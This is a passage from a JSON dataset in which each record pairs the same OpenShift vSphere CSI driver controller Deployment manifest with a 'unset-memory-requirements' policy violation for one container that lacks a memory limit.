    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: vmware-vsphere-csi-driver-controller\n  namespace: openshift-cluster-csi-drivers\n  annotations:\n    config.openshift.io/inject-proxy: csi-driver\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: vmware-vsphere-csi-driver-controller\n  template:\n    metadata:\n      labels:\n        app: vmware-vsphere-csi-driver-controller\n    spec:\n      serviceAccountName: vmware-vsphere-csi-driver-controller-sa\n      containers:\n      - name: csi-driver\n        image: ${DRIVER_IMAGE}\n        args:\n        - --fss-name=internal-feature-states.csi.vsphere.vmware.com\n        - --fss-namespace=$(CSI_NAMESPACE)\n        env:\n        - name: CSI_ENDPOINT\n          value: unix:///var/lib/csi/sockets/pluginproxy/csi.sock\n        - name: X_CSI_MODE\n          value: controller\n        - name: VSPHERE_CSI_CONFIG\n          value: /etc/kubernetes/vsphere-csi-config/cloud.conf\n        - name: LOGGER_LEVEL\n          value: PRODUCTION\n        - name: INCLUSTER_CLIENT_QPS\n          value: '100'\n        - name: INCLUSTER_CLIENT_BURST\n          value: '100'\n        - name: CSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: X_CSI_SERIAL_VOL_ACCESS_TIMEOUT\n          value: 3m\n        - name: X_CSI_SPEC_DISABLE_LEN_CHECK\n          value: 'true'\n        ports:\n        - name: healthz\n          containerPort: 10301\n          protocol: TCP\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        - name: vsphere-csi-config-volume\n          mountPath: /etc/kubernetes/vsphere-csi-config/\n          readOnly: true\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: csi-provisioner\n        image: ${PROVISIONER_IMAGE}\n        args:\n        - --csi-address=$(ADDRESS)\n        - --default-fstype=ext4\n        - --v=${LOG_LEVEL}\n        - --leader-election\n        - --http-endpoint=localhost:8202\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: provisioner-kube-rbac-proxy\n        args:\n        - --secure-listen-address=0.0.0.0:9202\n        - --upstream=http://127.0.0.1:8202/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        - --logtostderr=true\n        image: ${KUBE_RBAC_PROXY_IMAGE}\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 9202\n          name: provisioner-m\n          protocol: TCP\n        resources:\n          requests:\n            memory: 20Mi\n            cpu: 10m\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: metrics-serving-cert\n      - name: csi-attacher\n        image: ${ATTACHER_IMAGE}\n        args:\n        - --csi-address=$(ADDRESS)\n        - --http-endpoint=localhost:8203\n        - --v=${LOG_LEVEL}\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: attacher-kube-rbac-proxy\n        args:\n        - --secure-listen-address=0.0.0.0:9203\n        - --upstream=http://127.0.0.1:8203/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        - --logtostderr=true\n        image: ${KUBE_RBAC_PROXY_IMAGE}\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 9203\n          name: attacher-m\n          protocol: TCP\n        resources:\n          requests:\n            memory: 20Mi\n            cpu: 10m\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: metrics-serving-cert\n      - name: csi-resizer\n        image: ${RESIZER_IMAGE}\n        args:\n        - --csi-address=$(ADDRESS)\n        - --http-endpoint=localhost:8204\n        - --v=${LOG_LEVEL}\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: resizer-kube-rbac-proxy\n        args:\n        - --secure-listen-address=0.0.0.0:9204\n        - --upstream=http://127.0.0.1:8204/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        - --logtostderr=true\n        image: ${KUBE_RBAC_PROXY_IMAGE}\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 9204\n          name: resizer-m\n          protocol: TCP\n        resources:\n          requests:\n            memory: 20Mi\n            cpu: 10m\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: metrics-serving-cert\n      - name: csi-liveness-probe\n        image: ${LIVENESS_PROBE_IMAGE}\n        args:\n        - --csi-address=$(ADDRESS)\n        - --probe-timeout=3s\n        - --health-port=10301\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: vsphere-syncer\n        image: ${VMWARE_VSPHERE_SYNCER_IMAGE}\n        args:\n        - --leader-election\n        - --fss-name=internal-feature-states.csi.vsphere.vmware.com\n        - --fss-namespace=$(CSI_NAMESPACE)\n        env:\n        - name: FULL_SYNC_INTERVAL_MINUTES\n          value: '30'\n        - name: VSPHERE_CSI_CONFIG\n          value: /etc/kubernetes/vsphere-csi-config/cloud.conf\n        - name: LOGGER_LEVEL\n          value: PRODUCTION\n        - name: INCLUSTER_CLIENT_QPS\n          value: '100'\n        - name: INCLUSTER_CLIENT_BURST\n          value: '100'\n        - name: CSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        volumeMounts:\n        - mountPath: /etc/kubernetes/vsphere-csi-config\n          name: vsphere-csi-config-volume\n          readOnly: true\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n      - name: vsphere-csi-config-volume\n        configMap:\n          name: vsphere-csi-config\n      - name: metrics-serving-cert\n        secret:\n          secretName: vmware-vsphere-csi-driver-controller-metrics-serving-cert\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"csi-driver\" has memory limit 0"
  },
  {
    "id": "8996",
    "manifest_path": "data/manifests/the_stack_sample/sample_3389.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: vmware-vsphere-csi-driver-controller\n  namespace: openshift-cluster-csi-drivers\n  annotations:\n    config.openshift.io/inject-proxy: csi-driver\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: vmware-vsphere-csi-driver-controller\n  template:\n    metadata:\n      labels:\n        app: vmware-vsphere-csi-driver-controller\n    spec:\n      serviceAccountName: vmware-vsphere-csi-driver-controller-sa\n      containers:\n      - name: csi-driver\n        image: ${DRIVER_IMAGE}\n        args:\n        - --fss-name=internal-feature-states.csi.vsphere.vmware.com\n        - --fss-namespace=$(CSI_NAMESPACE)\n        env:\n        - name: CSI_ENDPOINT\n          value: unix:///var/lib/csi/sockets/pluginproxy/csi.sock\n        - name: X_CSI_MODE\n          value: controller\n        - name: VSPHERE_CSI_CONFIG\n          value: /etc/kubernetes/vsphere-csi-config/cloud.conf\n        - name: LOGGER_LEVEL\n          value: PRODUCTION\n        - name: INCLUSTER_CLIENT_QPS\n          value: '100'\n        - name: INCLUSTER_CLIENT_BURST\n          value: '100'\n        - name: CSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: X_CSI_SERIAL_VOL_ACCESS_TIMEOUT\n          value: 3m\n        - name: X_CSI_SPEC_DISABLE_LEN_CHECK\n          value: 'true'\n        ports:\n        - name: healthz\n          containerPort: 10301\n          protocol: TCP\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        - name: vsphere-csi-config-volume\n          mountPath: /etc/kubernetes/vsphere-csi-config/\n          readOnly: true\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: csi-provisioner\n        image: ${PROVISIONER_IMAGE}\n        args:\n        - --csi-address=$(ADDRESS)\n        - --default-fstype=ext4\n        - --v=${LOG_LEVEL}\n        - --leader-election\n        - --http-endpoint=localhost:8202\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: provisioner-kube-rbac-proxy\n        args:\n        - --secure-listen-address=0.0.0.0:9202\n        - --upstream=http://127.0.0.1:8202/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        - --logtostderr=true\n        image: ${KUBE_RBAC_PROXY_IMAGE}\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 9202\n          name: provisioner-m\n          protocol: TCP\n        resources:\n          requests:\n            memory: 20Mi\n            cpu: 10m\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: metrics-serving-cert\n      - name: csi-attacher\n        image: ${ATTACHER_IMAGE}\n        args:\n        - --csi-address=$(ADDRESS)\n        - --http-endpoint=localhost:8203\n        - --v=${LOG_LEVEL}\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: attacher-kube-rbac-proxy\n        args:\n        - --secure-listen-address=0.0.0.0:9203\n        - --upstream=http://127.0.0.1:8203/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        - --logtostderr=true\n        image: ${KUBE_RBAC_PROXY_IMAGE}\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 9203\n          name: attacher-m\n          protocol: TCP\n        resources:\n          requests:\n            memory: 20Mi\n            cpu: 10m\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: metrics-serving-cert\n      - name: csi-resizer\n        image: ${RESIZER_IMAGE}\n        args:\n        - --csi-address=$(ADDRESS)\n        - --http-endpoint=localhost:8204\n        - --v=${LOG_LEVEL}\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: resizer-kube-rbac-proxy\n        args:\n        - --secure-listen-address=0.0.0.0:9204\n        - --upstream=http://127.0.0.1:8204/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        - --logtostderr=true\n        image: ${KUBE_RBAC_PROXY_IMAGE}\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 9204\n          name: resizer-m\n          protocol: TCP\n        resources:\n          requests:\n            memory: 20Mi\n            cpu: 10m\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: metrics-serving-cert\n      - name: csi-liveness-probe\n        image: ${LIVENESS_PROBE_IMAGE}\n        args:\n        - --csi-address=$(ADDRESS)\n        - --probe-timeout=3s\n        - --health-port=10301\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: vsphere-syncer\n        image: ${VMWARE_VSPHERE_SYNCER_IMAGE}\n        args:\n        - --leader-election\n        - --fss-name=internal-feature-states.csi.vsphere.vmware.com\n        - --fss-namespace=$(CSI_NAMESPACE)\n        env:\n        - name: FULL_SYNC_INTERVAL_MINUTES\n          value: '30'\n        - name: VSPHERE_CSI_CONFIG\n          value: /etc/kubernetes/vsphere-csi-config/cloud.conf\n        - name: LOGGER_LEVEL\n          value: PRODUCTION\n        - name: INCLUSTER_CLIENT_QPS\n          value: '100'\n        - name: INCLUSTER_CLIENT_BURST\n          value: '100'\n        - name: CSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        volumeMounts:\n        - mountPath: /etc/kubernetes/vsphere-csi-config\n          name: vsphere-csi-config-volume\n          readOnly: true\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n      - name: vsphere-csi-config-volume\n        configMap:\n          name: vsphere-csi-config\n      - name: metrics-serving-cert\n        secret:\n          secretName: vmware-vsphere-csi-driver-controller-metrics-serving-cert\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"csi-liveness-probe\" has memory limit 0"
  },
  {
    "id": "8997",
    "manifest_path": "data/manifests/the_stack_sample/sample_3389.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: vmware-vsphere-csi-driver-controller\n  namespace: openshift-cluster-csi-drivers\n  annotations:\n    config.openshift.io/inject-proxy: csi-driver\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: vmware-vsphere-csi-driver-controller\n  template:\n    metadata:\n      labels:\n        app: vmware-vsphere-csi-driver-controller\n    spec:\n      serviceAccountName: vmware-vsphere-csi-driver-controller-sa\n      containers:\n      - name: csi-driver\n        image: ${DRIVER_IMAGE}\n        args:\n        - --fss-name=internal-feature-states.csi.vsphere.vmware.com\n        - --fss-namespace=$(CSI_NAMESPACE)\n        env:\n        - name: CSI_ENDPOINT\n          value: unix:///var/lib/csi/sockets/pluginproxy/csi.sock\n        - name: X_CSI_MODE\n          value: controller\n        - name: VSPHERE_CSI_CONFIG\n          value: /etc/kubernetes/vsphere-csi-config/cloud.conf\n        - name: LOGGER_LEVEL\n          value: PRODUCTION\n        - name: INCLUSTER_CLIENT_QPS\n          value: '100'\n        - name: INCLUSTER_CLIENT_BURST\n          value: '100'\n        - name: CSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: X_CSI_SERIAL_VOL_ACCESS_TIMEOUT\n          value: 3m\n        - name: X_CSI_SPEC_DISABLE_LEN_CHECK\n          value: 'true'\n        ports:\n        - name: healthz\n          containerPort: 10301\n          protocol: TCP\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        - name: vsphere-csi-config-volume\n          mountPath: /etc/kubernetes/vsphere-csi-config/\n          readOnly: true\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: csi-provisioner\n        image: ${PROVISIONER_IMAGE}\n        args:\n        - --csi-address=$(ADDRESS)\n        - --default-fstype=ext4\n        - --v=${LOG_LEVEL}\n        - --leader-election\n        - --http-endpoint=localhost:8202\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: provisioner-kube-rbac-proxy\n        args:\n        - --secure-listen-address=0.0.0.0:9202\n        - --upstream=http://127.0.0.1:8202/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        - --logtostderr=true\n        image: ${KUBE_RBAC_PROXY_IMAGE}\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 9202\n          name: provisioner-m\n          protocol: TCP\n        resources:\n          requests:\n            memory: 20Mi\n            cpu: 10m\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: metrics-serving-cert\n      - name: csi-attacher\n        image: ${ATTACHER_IMAGE}\n        args:\n        - --csi-address=$(ADDRESS)\n        - --http-endpoint=localhost:8203\n        - --v=${LOG_LEVEL}\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: attacher-kube-rbac-proxy\n        args:\n        - --secure-listen-address=0.0.0.0:9203\n        - --upstream=http://127.0.0.1:8203/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        - --logtostderr=true\n        image: ${KUBE_RBAC_PROXY_IMAGE}\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 9203\n          name: attacher-m\n          protocol: TCP\n        resources:\n          requests:\n            memory: 20Mi\n            cpu: 10m\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: metrics-serving-cert\n      - name: csi-resizer\n        image: ${RESIZER_IMAGE}\n        args:\n        - --csi-address=$(ADDRESS)\n        - --http-endpoint=localhost:8204\n        - --v=${LOG_LEVEL}\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: resizer-kube-rbac-proxy\n        args:\n        - --secure-listen-address=0.0.0.0:9204\n        - --upstream=http://127.0.0.1:8204/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        - --logtostderr=true\n        image: ${KUBE_RBAC_PROXY_IMAGE}\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 9204\n          name: resizer-m\n          protocol: TCP\n        resources:\n          requests:\n            memory: 20Mi\n            cpu: 10m\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: metrics-serving-cert\n      - name: csi-liveness-probe\n        image: ${LIVENESS_PROBE_IMAGE}\n        args:\n        - --csi-address=$(ADDRESS)\n        - --probe-timeout=3s\n        - --health-port=10301\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: vsphere-syncer\n        image: ${VMWARE_VSPHERE_SYNCER_IMAGE}\n        args:\n        - --leader-election\n        - --fss-name=internal-feature-states.csi.vsphere.vmware.com\n        - --fss-namespace=$(CSI_NAMESPACE)\n        env:\n        - name: FULL_SYNC_INTERVAL_MINUTES\n          value: '30'\n        - name: VSPHERE_CSI_CONFIG\n          value: /etc/kubernetes/vsphere-csi-config/cloud.conf\n        - name: LOGGER_LEVEL\n          value: PRODUCTION\n        - name: INCLUSTER_CLIENT_QPS\n          value: '100'\n        - name: INCLUSTER_CLIENT_BURST\n          value: '100'\n        - name: CSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        volumeMounts:\n        - mountPath: /etc/kubernetes/vsphere-csi-config\n          name: vsphere-csi-config-volume\n          readOnly: true\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n      - name: vsphere-csi-config-volume\n        configMap:\n          name: vsphere-csi-config\n      - name: metrics-serving-cert\n        secret:\n          secretName: vmware-vsphere-csi-driver-controller-metrics-serving-cert\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"csi-provisioner\" has memory limit 0"
  },
  {
    "id": "8998",
    "manifest_path": "data/manifests/the_stack_sample/sample_3389.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: vmware-vsphere-csi-driver-controller\n  namespace: openshift-cluster-csi-drivers\n  annotations:\n    config.openshift.io/inject-proxy: csi-driver\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: vmware-vsphere-csi-driver-controller\n  template:\n    metadata:\n      labels:\n        app: vmware-vsphere-csi-driver-controller\n    spec:\n      serviceAccountName: vmware-vsphere-csi-driver-controller-sa\n      containers:\n      - name: csi-driver\n        image: ${DRIVER_IMAGE}\n        args:\n        - --fss-name=internal-feature-states.csi.vsphere.vmware.com\n        - --fss-namespace=$(CSI_NAMESPACE)\n        env:\n        - name: CSI_ENDPOINT\n          value: unix:///var/lib/csi/sockets/pluginproxy/csi.sock\n        - name: X_CSI_MODE\n          value: controller\n        - name: VSPHERE_CSI_CONFIG\n          value: /etc/kubernetes/vsphere-csi-config/cloud.conf\n        - name: LOGGER_LEVEL\n          value: PRODUCTION\n        - name: INCLUSTER_CLIENT_QPS\n          value: '100'\n        - name: INCLUSTER_CLIENT_BURST\n          value: '100'\n        - name: CSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: X_CSI_SERIAL_VOL_ACCESS_TIMEOUT\n          value: 3m\n        - name: X_CSI_SPEC_DISABLE_LEN_CHECK\n          value: 'true'\n        ports:\n        - name: healthz\n          containerPort: 10301\n          protocol: TCP\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        - name: vsphere-csi-config-volume\n          mountPath: /etc/kubernetes/vsphere-csi-config/\n          readOnly: true\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: csi-provisioner\n        image: ${PROVISIONER_IMAGE}\n        args:\n        - --csi-address=$(ADDRESS)\n        - --default-fstype=ext4\n        - --v=${LOG_LEVEL}\n        - --leader-election\n        - --http-endpoint=localhost:8202\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: provisioner-kube-rbac-proxy\n        args:\n        - --secure-listen-address=0.0.0.0:9202\n        - --upstream=http://127.0.0.1:8202/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        - --logtostderr=true\n        image: ${KUBE_RBAC_PROXY_IMAGE}\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 9202\n          name: provisioner-m\n          protocol: TCP\n        resources:\n          requests:\n            memory: 20Mi\n            cpu: 10m\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: metrics-serving-cert\n      - name: csi-attacher\n        image: ${ATTACHER_IMAGE}\n        args:\n        - --csi-address=$(ADDRESS)\n        - --http-endpoint=localhost:8203\n        - --v=${LOG_LEVEL}\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: attacher-kube-rbac-proxy\n        args:\n        - --secure-listen-address=0.0.0.0:9203\n        - --upstream=http://127.0.0.1:8203/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        - --logtostderr=true\n        image: ${KUBE_RBAC_PROXY_IMAGE}\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 9203\n          name: attacher-m\n          protocol: TCP\n        resources:\n          requests:\n            memory: 20Mi\n            cpu: 10m\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: metrics-serving-cert\n      - name: csi-resizer\n        image: ${RESIZER_IMAGE}\n        args:\n        - --csi-address=$(ADDRESS)\n        - --http-endpoint=localhost:8204\n        - --v=${LOG_LEVEL}\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: resizer-kube-rbac-proxy\n        args:\n        - --secure-listen-address=0.0.0.0:9204\n        - --upstream=http://127.0.0.1:8204/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        - --logtostderr=true\n        image: ${KUBE_RBAC_PROXY_IMAGE}\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 9204\n          name: resizer-m\n          protocol: TCP\n        resources:\n          requests:\n            memory: 20Mi\n            cpu: 10m\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: metrics-serving-cert\n      - name: csi-liveness-probe\n        image: ${LIVENESS_PROBE_IMAGE}\n        args:\n        - --csi-address=$(ADDRESS)\n        - --probe-timeout=3s\n        - --health-port=10301\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: vsphere-syncer\n        image: ${VMWARE_VSPHERE_SYNCER_IMAGE}\n        args:\n        - --leader-election\n        - --fss-name=internal-feature-states.csi.vsphere.vmware.com\n        - --fss-namespace=$(CSI_NAMESPACE)\n        env:\n        - name: FULL_SYNC_INTERVAL_MINUTES\n          value: '30'\n        - name: VSPHERE_CSI_CONFIG\n          value: /etc/kubernetes/vsphere-csi-config/cloud.conf\n        - name: LOGGER_LEVEL\n          value: PRODUCTION\n        - name: INCLUSTER_CLIENT_QPS\n          value: '100'\n        - name: INCLUSTER_CLIENT_BURST\n          value: '100'\n        - name: CSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        volumeMounts:\n        - mountPath: /etc/kubernetes/vsphere-csi-config\n          name: vsphere-csi-config-volume\n          readOnly: true\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n      - name: vsphere-csi-config-volume\n        configMap:\n          name: vsphere-csi-config\n      - name: metrics-serving-cert\n        secret:\n          secretName: vmware-vsphere-csi-driver-controller-metrics-serving-cert\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"csi-resizer\" has memory limit 0"
  },
  {
    "id": "8999",
    "manifest_path": "data/manifests/the_stack_sample/sample_3389.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: vmware-vsphere-csi-driver-controller\n  namespace: openshift-cluster-csi-drivers\n  annotations:\n    config.openshift.io/inject-proxy: csi-driver\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: vmware-vsphere-csi-driver-controller\n  template:\n    metadata:\n      labels:\n        app: vmware-vsphere-csi-driver-controller\n    spec:\n      serviceAccountName: vmware-vsphere-csi-driver-controller-sa\n      containers:\n      - name: csi-driver\n        image: ${DRIVER_IMAGE}\n        args:\n        - --fss-name=internal-feature-states.csi.vsphere.vmware.com\n        - --fss-namespace=$(CSI_NAMESPACE)\n        env:\n        - name: CSI_ENDPOINT\n          value: unix:///var/lib/csi/sockets/pluginproxy/csi.sock\n        - name: X_CSI_MODE\n          value: controller\n        - name: VSPHERE_CSI_CONFIG\n          value: /etc/kubernetes/vsphere-csi-config/cloud.conf\n        - name: LOGGER_LEVEL\n          value: PRODUCTION\n        - name: INCLUSTER_CLIENT_QPS\n          value: '100'\n        - name: INCLUSTER_CLIENT_BURST\n          value: '100'\n        - name: CSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: X_CSI_SERIAL_VOL_ACCESS_TIMEOUT\n          value: 3m\n        - name: X_CSI_SPEC_DISABLE_LEN_CHECK\n          value: 'true'\n        ports:\n        - name: healthz\n          containerPort: 10301\n          protocol: TCP\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        - name: vsphere-csi-config-volume\n          mountPath: /etc/kubernetes/vsphere-csi-config/\n          readOnly: true\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: csi-provisioner\n        image: ${PROVISIONER_IMAGE}\n        args:\n        - --csi-address=$(ADDRESS)\n        - --default-fstype=ext4\n        - --v=${LOG_LEVEL}\n        - --leader-election\n        - --http-endpoint=localhost:8202\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: provisioner-kube-rbac-proxy\n        args:\n        - --secure-listen-address=0.0.0.0:9202\n        - --upstream=http://127.0.0.1:8202/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        - --logtostderr=true\n        image: ${KUBE_RBAC_PROXY_IMAGE}\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 9202\n          name: provisioner-m\n          protocol: TCP\n        resources:\n          requests:\n            memory: 20Mi\n            cpu: 10m\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: metrics-serving-cert\n      - name: csi-attacher\n        image: ${ATTACHER_IMAGE}\n        args:\n        - --csi-address=$(ADDRESS)\n        - --http-endpoint=localhost:8203\n        - --v=${LOG_LEVEL}\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: attacher-kube-rbac-proxy\n        args:\n        - --secure-listen-address=0.0.0.0:9203\n        - --upstream=http://127.0.0.1:8203/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        - --logtostderr=true\n        image: ${KUBE_RBAC_PROXY_IMAGE}\n        imagePullPolicy: 